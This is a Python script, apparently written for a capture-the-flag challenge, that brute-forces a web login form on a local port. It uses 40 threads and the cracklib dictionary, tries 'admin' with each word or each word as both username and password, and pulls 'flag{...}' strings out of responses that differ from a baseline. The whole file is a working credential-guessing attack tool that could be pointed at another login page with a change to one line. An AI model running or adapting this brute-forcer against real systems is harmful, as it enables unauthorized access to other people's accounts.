import requests, sys, concurrent.futures, threading, string
URL="http://127.0.0.1:32973/index.php"
base=requests.post(URL,data={"username":"___zzz___","password":"___zzz___"}).text
print("baseline len",len(base),flush=True)
tls=threading.local()
def sess():
    if not hasattr(tls,'s'): tls.s=requests.Session()
    return tls.s
def check(pair):
    u,p=pair
    for _ in range(3):
        try:
            r=sess().post(URL,data={"username":u,"password":p},timeout=10)
            t=r.text
            if t!=base:
                return (u,p,len(t),'flag{'+t.split('flag{')[1].split('}')[0]+'}' if 'flag{' in t else '')
            return None
        except Exception as e:
            continue
    return ('ERROR',u,p,str(e))

def run(pairs):
    n=0
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        for res in ex.map(check,pairs,chunksize=200):
            if res:
                print("HIT",res,flush=True)
            n+=1
    print("done",n,flush=True)

mode=sys.argv[1]
words=[w.strip() for w in open('/usr/share/dict/cracklib-small') if w.strip()]
if mode=='admin':
    run([("admin",w) for w in words])
elif mode=='same':
    run([(w,w) for w in words])
